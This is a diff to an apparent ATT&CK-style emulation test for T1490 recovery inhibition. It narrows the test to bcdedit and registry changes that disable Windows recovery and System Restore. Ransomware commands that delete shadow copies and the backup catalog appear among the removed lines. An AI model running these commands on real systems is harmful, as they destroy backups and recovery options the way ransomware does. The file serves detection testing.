@@ -1,15 +1,12 @@
 id: T1490
 name: Inhibit System Recovery
-description: Full 5-step ransomware pre-encryption recovery deletion sequence used by Ryuk, LockBit, BlackMatter — bcdedit /set recoveryenabled no, vssadmin delete shadows (standalone tier-1 SIEM alert), wmic shadowcopy delete, wbadmin delete catalog, and System Restore registry disable. All steps generate EID 4688 with high-signal CommandLine. Cleanup restores all settings.
+description: "Scope-limited ransomware recovery inhibition — bcdedit /set recoveryenabled no and System Restore registry disable. Generates EID 4688 for bcdedit.exe and Sysmon EID 13 for registry changes. Shadow copy deletion (vssadmin/wmic) removed as irreversible on client machines."
 tactic: impact
 technique_id: T1490
 platform: windows
 phase: attack
 elevation_required: true
 expected_events:
-  - event_id: 4688
-    channel: "Security"
-    description: "vssadmin.exe 'delete shadows /all /quiet' — standalone tier-1 SIEM alert"
   - event_id: 4688
     channel: "Security"
     description: "bcdedit.exe /set recoveryenabled no"
@@ -23,9 +20,9 @@ tags:
 executor:
   type: powershell
   command: |-
-    Write-Host "[T1490] Inhibit System Recovery — full ransomware pre-encryption sequence"
+    Write-Host "[T1490] Inhibit System Recovery — scope-limited (no shadow deletion)"
 
-    # Backup current settings for cleanup
+    # Backup current settings for cleanup reference
     $origRecovery = (bcdedit /enum {default} 2>&1 | Select-String "recoveryenabled").ToString()
     Write-Host "Current recoveryenabled state: $origRecovery"
 
@@ -34,24 +31,12 @@ executor:
     bcdedit.exe /set "{default}" bootstatuspolicy ignoreallfailures 2>&1 | Write-Host
     bcdedit.exe /set "{default}" recoveryenabled no 2>&1 | Write-Host
 
-    # Step 2: vssadmin delete shadows — #1 ransomware indicator (standalone SIEM alert)
-    Write-Host "--- Step 2: vssadmin delete shadows /all /quiet (tier-1 SIEM alert) ---"
-    vssadmin.exe delete shadows /all /quiet 2>&1 | Write-Host
-
-    # Step 3: WMIC shadow copy delete (redundant method real ransomware uses)
-    Write-Host "--- Step 3: wmic shadowcopy delete (EID 4688 for wmic.exe) ---"
-    wmic.exe shadowcopy delete 2>&1 | Write-Host
-
-    # Step 4: Delete backup catalog
-    Write-Host "--- Step 4: wbadmin delete catalog (EID 4688 for wbadmin.exe) ---"
-    wbadmin.exe delete catalog -quiet 2>&1 | Write-Host
-
-    # Step 5: System Restore registry disable (Sysmon EID 13 RegistryValueSet)
-    Write-Host "--- Step 5: Disable System Restore via registry (Sysmon EID 13) ---"
+    # Step 2: System Restore registry disable (Sysmon EID 13 RegistryValueSet)
+    Write-Host "--- Step 2: Disable System Restore via registry (Sysmon EID 13) ---"
     reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v DisableConfig /t REG_DWORD /d 1 /f 2>&1 | Write-Host
     reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v DisableSR /t REG_DWORD /d 1 /f 2>&1 | Write-Host
 
-    Write-Host "[T1490] Complete. 5-step sequence matches Ryuk/LockBit pre-encryption pattern."
+    Write-Host "[T1490] Complete. bcdedit + registry steps executed. Shadow deletion skipped (irreversible)."
 cleanup: |-
   bcdedit.exe /set "{default}" recoveryenabled yes 2>&1 | Out-Null
   bcdedit.exe /set "{default}" bootstatuspolicy displayallfailures 2>&1 | Out-Null
